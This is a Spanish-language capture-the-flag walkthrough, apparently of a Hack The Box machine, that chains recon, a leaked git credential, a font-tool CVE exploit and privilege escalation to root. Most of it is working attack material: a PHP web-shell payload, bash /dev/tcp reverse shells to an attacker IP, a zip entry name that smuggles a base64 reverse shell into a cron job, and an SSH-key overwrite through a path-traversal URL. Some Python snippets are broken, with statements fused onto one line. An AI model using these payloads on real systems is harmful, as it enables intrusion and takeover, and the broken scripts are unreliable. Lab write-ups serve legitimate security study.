
# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.10.76 -oG allPorts
```

```shell
  [*] IP Address: 10.129.10.76
  [*] Open ports: 22,80
```

```shell
nmap -p 22,80 -sCV -oN targeted 10.129.10.76
```

## HTTP
### variatype.htb

```shell
whatweb http://variatype.htb/
```

![[Pasted image 20260316130529.png]]

```shell
ffuf -c -u http://variatype.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

```shell
ffuf -c -u http://variatype.htb -H "Host: FUZZ.variatype.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --mc=200
```


### portal.variatype.htb

```shell
whatweb http://portal.variatype.htb/
```

![[Pasted image 20260316132410.png]]

```shell
nuclei -target http://portal.variatype.htb/
```

```ad-info
http://portal.variatype.htb/.git/config
```

Se nos descarga un fichero donde encontramos
```shell
 [user]
     name = Dev Team
     email = dev@variatype.htb
```
Lo cual nos indica que ha hay un github

Dumpeamos el .git entero
```shell
 git-dumper http://portal.variatype.htb/.git/ ./git-portal
```

Buscamos cuantos commits ha habido
```shell
git log
```
Encontramos que ha habido varios commits, el actual es *HEAD* 

Y buscamos las diferencias entré el commit actual *HEAD (Commit actual)* y el ultimo commit que ha sucedido *HEAD~1 (Commit anterior)* 
```shell
git diff HEAD~1 HEAD
```

Encontramos como hubo una modificación en el archivo `auth.php` y encontramos las credenciales del usuario `gitbot`
```ad-hint
gitbot::G1tB0t_Acc3ss_2025!
```

Pudiendo usarlas y acceder al dashboard
![[Pasted image 20260316164815.png]]

Nos muestra que no hay fuentes recientes cargadas en el generador de fuentes que hemos visto en el subdominio anterior

Antes de continuar hacemos fuzzing sobre los directorios con la cookie del usuario obtenido
```shell
ffuf -c -u http://portal.variatype.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -b "PHPSESSID=9l19ilf84urobm3h3vaf96stop"
```

También buscamos ficheros sensibles filtrando por extensiones
```shell
ffuf -c -u http://portal.variatype.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -b "PHPSESSID=9l19ilf84urobm3h3vaf96stop" -e php,py,html
```

Encontrando el fichero `download.php` en el cual a la hora de acceder te pide el parámetro `file`, probaremos cargando un archivo y viendo como se le llama a este, en este caso se le llama con el parámetro `f`

![[Pasted image 20260316170954.png]]


Necesitaremos subir el archivo `.ttf` y el `.desingspace` explotando la vulnerabilidad `CVE-2025-66034` pudiendo encontrar una guía en `https://github.com/advisories/GHSA-768j-98cg-p3fv`, tendremos que subir los dos archivos e interceptar la petición pudiendo modificar el `malicious.designspace` para ejecutar un RCE

Cuando se modifica la petición incluimos el siguiente contenido en el `malicious.desingspace`
```xml
<?xml version='1.0' encoding='UTF-8'?> 
<designspace format="5.0">
	<axes> 
		<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
			<labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]]]><![CDATA[>]]></labelname> 
		</axis>
	</axes>
	<sources>
		<source filename="source-light.ttf" name="Light">
			<location><dimension name="Weight" xvalue="100"/></location>
		</source> 
		<source filename="source-regular.ttf" name="Regular">
			<location><dimension name="Weight" xvalue="400"/></location>
		</source>
	</sources>
	<variable-fonts>
		<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
			<axis-subsets>
				<axis-subset name="Weight"/>
			</axis-subsets>
		</variable-font>
	</variable-fonts>
</designspace>
```

Ahora accederemos a donde se almacena los fichero en `/files/shell.php` y vemos que podemos ejecutar comandos

![[Pasted image 20260317111343.png]]

Tenemos una WebShell, vamos a convertirlo en una ReverseShell
Primero tendremos que monernos en escucha
```shell
penelope -p 4444
```

Y en la web shell nos mandamos una bash con curl
```shell
bash -c 'bash -i >%26 %2Fdev%2Ftcp%2F10.10.15.158%2F4444 0>%261'
```

Obteniendo la ReverseShell

En el `home` de la aplicacion encontramos un usuario llamdo `steve` vamos a intentar pivotar a el

Para escalar primero probaremos con permisos sudoers
```shell
sudo -l
```

En el cual se nos pide contraseña la cual no tenemos
Probaremos con SUID
```shell
find / -perm -4000 2>/dev/null
```
```shell
find / -perm -4000 -ls 2>/dev/null
```


No encontramos nada que nos pueda ser útil así que probaremos con las tareas cron, usaremos la herramienta [[PSPY]]
Nos descargamos la herramienta en nuestra maquina `https://github.com/DominicBreuker/pspy?tab=readme-ov-file`
Y nos abrimos un servidor con Python
```shell
python3 -m http.server 80
```

Y en la maquina victima lo descargamos en `/tml`
```shell
curl -O http://10.10.15.158/pspy64
```

Le damos permisos de ejecución
```shell
chmod +x pspy64
```

Y lo ejecutamos
```shell
./pspy64 -pf -i 1000
```

Encontramos un proceso corriendo bajo el usuario `steve`
```shell
/home/steve/bin/process_client_submissions.sh
```

Lo que debemos de hacer al no poder leer el proceso es buscar si hay alguna copia en la maquina o este esta renombrado de alguna forma
```shell
find / -name "*client*submission*" -o -name "*process*client*" 2>/dev/nul
```

Encontrándonos en `/opt` un archivo con el nombre `/opt/process_client_submissions.bak`
Al ver el proceso vemos que este trabaja con ficheros zip, en el cual solo valida el nombre del archivo sin validar su contenido así que vamos a explotar esa rama.

Primero crearemos una reverse shell en base64
```shell
echo "bash -i >& /dev/tcp/10.10.15.158/5555 0>&1" | base64
```

Con la salida de base64 la añadiremos al siguiente escript que nos ayudara a crear el fichero zip correspondiente
Crearemos un fichero en `/tmp`
```shell
nano /tmp/make_exploit.py
```

Dentro de el crearemos el siguiente script
```python
import zipfile 
payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNTgvNTU1NSAwPiYxCg==" 
exploit_filename = f"$(echo {payload}|base64 -d|bash).ttf" with zipfile.ZipFile('/tmp/exploit.zip', 'w') as zipf:
	zipf.writestr(exploit_filename, "dummy content")
print("exploit.zip created!")
```

En este se hace el siguiente paso:
- *`exploit_filename`* -> Crea el fichero `.zip` con nombre malicioso, este funciona por que en la tarea cron de `steve` se ejecuta
```python
	fontforge -c "fontforge.open('$file')"
```
  Cuando `$file` es `$(echo ...|base64 -d|bash).ttf`, el shell ejecuta primero lo que está dentro de `$()` antes de pasarlo a fontforge.

Una vez lo tenemos listo, ejecutamos el script y el `.zip` que obtenemos nos lo pasamos a la maquina al directorio sobre la que la tarea cron se esta ejecutando
```shell
curl http://10.10.15.158:80/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip
```

Poniéndonos en escucha en el puerto indicado obtendremos una shell como `steve`

Para ver la escalada de privilegios empezaremso enumerando sobre lo que tenemos permisos de root
```shell
sudo -l
```

Viendo los siguientes permisos:
```shell
 /usr/bin/python3 /opt/font-tools/install_validator.py *
```

El cual nos permite ejecutar el script como root sin contraseña
Generaremos las claves SSH y las movemos a tmp
```shell
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
cp /tmp/rootkey.pub /tmp/serve/authorized_keys
```

Generamos un servidor el cual suiempre sirve las claves de ssh y esta siempre en escucha en el puerto `8888` lo crearemos con python
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('authorized_keys', 'rb') as f:
            data = f.read()
        # Sirve la clave pública como archivo
	    self.send_response(200) self.send_header('Content-Type', 'text/plain')
	    self.send_header('Content-Length', len(data)) 
	    self.end_headers() 
	    self.wfile.write(data) HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

Lo ejecutamos el script
```shell
cd /tmp/serve && python3 server.py
```

Y lo ejecutamos en la maquina victima
```shell
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://YOUR_IP:8888/%2Froot%2F.ssh%2Fauthorized_keys"
```

Y podremos conectarnos asi por ssh
```shell
ssh -i /tmp/rootkey root@TARGET_IP
```

Obteneindo una shell como root

